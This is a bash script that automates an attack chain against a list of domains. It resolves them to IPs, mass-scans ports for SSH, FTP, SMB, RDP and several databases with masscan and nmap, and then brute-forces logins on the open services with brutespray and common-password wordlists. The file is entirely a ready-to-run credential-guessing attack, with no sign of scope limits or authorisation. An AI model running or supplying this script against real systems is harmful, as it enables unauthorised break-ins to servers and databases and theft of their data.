#! /bin/bash


BOLD=$(tput bold)
RED=$(tput setaf 1)
NC=$(tput sgr0)
file_path=${1}
output_file=${2}
temp_file=$(mktemp)


while IFS= read -r domain; do
	ip=$(dig +short A "$domain" | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}')
	if [ ! -z "$ip" ]; then
		echo "$ip" >> $temp_file
	fi
done < "$file_path"


sort -u "$temp_file" > "$output_file" && rm "$temp_file"

sudo masscan -p22,3306,21,1433,5432,445,27017,1521,3389 --banners --source-ip 192.168.1.200 -iL "${output_file}" -oL "spstdin_masscan.txt"
cat "spstdin_masscan.txt" | grep -oP '(\d{1,3}\.){3}\d{1,3}' | sort -u > "spstdin_cleaned_masscan_results.txt"
# Check if the cleaned file has results
if [ ! -s "spstdin_cleaned_masscan_results.txt" ]; then
	echo -e "${BOLD}${RED}[!] No valid IPs found in masscan results. Exiting...${NC}"
        exit 1
fi
sudo nmap -Pn -sV -iL "spstdin_cleaned_masscan_results.txt" -p22,3306,21,1433,5432,445,27017,1521,3389 -oG "spstdin_nmap.gnmap"
if [ $? -ne 0 ]; then
	echo -e "${BOLD}${RED}[!] Nmap failed. Exiting...${NC}"
	exit 1
fi
brutespray -f "spstdin_nmap.gnmap" -u /home/kali/SecLists/Usernames/top-usernames-shortlist.txt -p /home/kali/SecLists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt -t 5 -o "brutespray_output.txt"
brutespray -f "spstdin_nmap.gnmap" -u /home/kali/SecLists/Usernames/top-usernames-shortlist.txt -p /home/kali/SecLists/Passwords/Common-Credentials/worst-passwords-2017-top100-slashdata.txt -t 5 -o "brutespray_output_2.txt"
brutespray -f "spstdin_nmap.gnmap" -u /home/kali/SecLists/Usernames/top-usernames-shortlist.txt -p /home/kali/SecLists/Passwords/Common-Credentials/best110.txt -t 5 -o "brutespray_output_3.txt"

# Check if brutespray ran successfully
if [ $? -ne 0 ]; then
        echo -e "${BOLD}${RED}[!] Brutespray failed. Exiting...${NC}"
        exit 1
fi

echo -e "${BOLD}${RED}[*]Brutespray results saved to brutespray_output.txt,brutespray_output_2.txt,brutespray_output_3.txt ${NC}"

